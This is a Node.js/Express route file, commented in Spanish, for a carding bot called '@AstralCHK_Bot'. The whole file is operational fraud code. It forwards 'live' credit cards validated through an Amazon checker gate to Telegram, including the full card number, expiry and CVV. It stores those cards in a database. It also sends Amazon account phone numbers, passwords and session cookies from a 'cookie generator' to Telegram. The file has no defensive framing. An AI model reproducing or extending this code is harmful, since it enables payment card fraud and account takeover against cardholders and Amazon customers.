// routes/telegram.js
const express = require('express');
const router = express.Router();
const { pool } = require('../database');
const { sendLiveToTelegram } = require('../bot_telegram'); // Importar función del bot
const { escapeMarkdown } = require('../bot_telegram');

// ============================================
// ENDPOINT 1: Enviar live a Telegram
// ============================================
router.post('/send-live', async (req, res) => {
    try {
        const { username, card, result } = req.body;
        
        if (!username || !card) {
            return res.status(400).json({
                success: false,
                error: 'username y card son requeridos'
            });
        }
        
        console.log(`📤 Enviando live a Telegram para @${username}: ${card}`);
        
        // Buscar el chat_id del usuario en la base de datos
        const userResult = await pool.query(
            'SELECT id, telegram_chat_id FROM users WHERE username = $1',
            [username]
        );
        
        if (userResult.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Usuario no encontrado'
            });
        }
        
        const user = userResult.rows[0];
        
        if (!user.telegram_chat_id) {
            return res.status(400).json({
                success: false,
                error: 'El usuario no ha vinculado su Telegram. Debe escribir /start al bot primero.'
            });
        }
        
        // Formatear mensaje bonito para Telegram
        const mensaje = formatearMensajeTelegram(card, result);
        
        // Usar la función del bot para enviar el mensaje
        const envioResult = await sendLiveToTelegram(user.telegram_chat_id, mensaje);
        
        if (envioResult.success) {
            res.json({
                success: true,
                message: 'Live enviada a Telegram correctamente'
            });
        } else {
            res.status(500).json({
                success: false,
                error: envioResult.error || 'Error al enviar a Telegram'
            });
        }
        
    } catch (error) {
        console.error('❌ Error en /send-live:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================
// ENDPOINT 2: Guardar live en base de datos
// ============================================
const { upsertLive } = require('../models/UserLive');

router.post('/save-live', async (req, res) => {
    try {
        const { username, card, result } = req.body;
        if (!username || !card || !result) {
            return res.status(400).json({ success: false, error: 'Faltan datos' });
        }

        // Obtener user_id
        const userRes = await pool.query('SELECT id FROM users WHERE username = $1', [username]);
        if (userRes.rows.length === 0) {
            return res.status(404).json({ success: false, error: 'Usuario no encontrado' });
        }
        const userId = userRes.rows[0].id;

        // Preparar datos de la tarjeta
        const partes = card.split('|');
        const cardData = {
            card_full: card,
            card_type: 'CCS' // o inferir
        };

        // Extraer gate_name, bank, country del resultado si están disponibles
        const gateName = result.gate || 'Amazon';
        const bankName = result.bank || null;
        const country = result.country || null;
        const network = result.network || null;
        const cardClass = result.card_class || null;

        // Guardar/actualizar live
        const upsertResult = await upsertLive(
            userId,
            cardData,
            gateName,
            null, // checkerId
            bankName,
            country,
            network,
            cardClass
        );

        if (upsertResult.wasUpdated) {
            console.log(`🔄 Live actualizada para ${username}: ${card} (${upsertResult.liveId})`);
        } else {
            console.log(`✅ Live insertada para ${username}: ${card} (${upsertResult.liveId})`);
        }

        res.json({ success: true, liveId: upsertResult.liveId });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});
function formatearMensajeTelegram(card, result) {
    const partes = card.split('|');
    const numero = partes[0];
    const mes = partes[1];
    const año = partes[2];
    const cvv = partes[3];
    
    const numeroFormateado = numero.replace(/(.{4})/g, '$1 ').trim();
    const bin = numero.slice(0, 6);
    const ultimos4 = numero.slice(-4);
    
    let mensaje = `🎯 <b>¡LIVE ENCONTRADA!</b> 🎯\n\n`;
    mensaje += `💳 <b>Tarjeta:</b> <code>${numeroFormateado}</code>\n`;
    mensaje += `📅 <b>Fecha:</b> ${mes}/${año}\n`;
    mensaje += `🔐 <b>CVV:</b> ${cvv}\n`;
    mensaje += `🔢 <b>BIN:</b> ${bin}\n`;
    mensaje += `🔄 <b>Últimos 4:</b> ${ultimos4}\n\n`;
    
    if (result) {
        mensaje += `📊 <b>Resultado:</b> ${result.original_status || result.status || 'LIVE'}\n`;
        if (result.message) {
            mensaje += `📝 <b>Detalle:</b> ${result.message}\n`;
        }
    }
    
    mensaje += `\n⏰ <b>Hora:</b> ${new Date().toLocaleString()}\n`;
    mensaje += `🛒 <b>Gate:</b> Amazon CHK\n`;
    mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `@AstralCHK_Bot`;
    
    return mensaje;
}
// ============================================
// ENDPOINT 3: Enviar cookie a Telegram
// ============================================
router.post('/send-cookie', async (req, res) => {
    try {
        const { username, phone, password, cookieString, country } = req.body;
        
        if (!username || !phone || !password || !cookieString) {
            return res.status(400).json({
                success: false,
                error: 'Faltan datos: username, phone, password, cookieString son requeridos'
            });
        }
        
        console.log(`📤 Enviando cookie a Telegram para @${username}`);
        
        // Buscar el chat_id del usuario en la base de datos
        const userResult = await pool.query(
            'SELECT id, telegram_chat_id FROM users WHERE username = $1',
            [username]
        );
        
        if (userResult.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Usuario no encontrado'
            });
        }
        
        const user = userResult.rows[0];
        
        if (!user.telegram_chat_id) {
            return res.status(400).json({
                success: false,
                error: 'El usuario no ha vinculado su Telegram. Debe escribir /start al bot primero.'
            });
        }
        
        // Formatear mensaje bonito para Telegram
        const mensaje = formatearMensajeCookie(phone, password, cookieString, country);
        
        // Usar la función del bot para enviar el mensaje
        const { sendLiveToTelegram } = require('../bot_telegram');
        const envioResult = await sendLiveToTelegram(user.telegram_chat_id, mensaje);
        
        if (envioResult.success) {
            res.json({
                success: true,
                message: 'Cookie enviada a Telegram correctamente'
            });
        } else {
            res.status(500).json({
                success: false,
                error: envioResult.error || 'Error al enviar a Telegram'
            });
        }
        
    } catch (error) {
        console.error('❌ Error en /send-cookie:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Función auxiliar para formatear mensaje de cookie
function formatearMensajeCookie(phone, password, cookieString, country = 'MX') {
    const flag = country === 'MX' ? '🇲🇽' : '🌍';
    
    let mensaje = `🍪 *¡NUEVA COOKIE AMAZON GENERADA!* 🍪\n\n`;
    mensaje += `📞 *Teléfono:* \`${phone}\`\n`;
    mensaje += `🔑 *Contraseña:* \`${password}\`\n`;
    mensaje += `🌎 *País:* ${flag} ${country}\n\n`;
    mensaje += `🍪 *Cookie String:*\n\`\`\`\n${cookieString}\n\`\`\`\n\n`;
    mensaje += `⏰ *Generada:* ${new Date().toLocaleString()}\n`;
    mensaje += `🛒 *Servicio:* Amazon Cookie Generator\n`;
    mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `@AstralCHK_Bot`;
    
    return mensaje;
}

module.exports = router;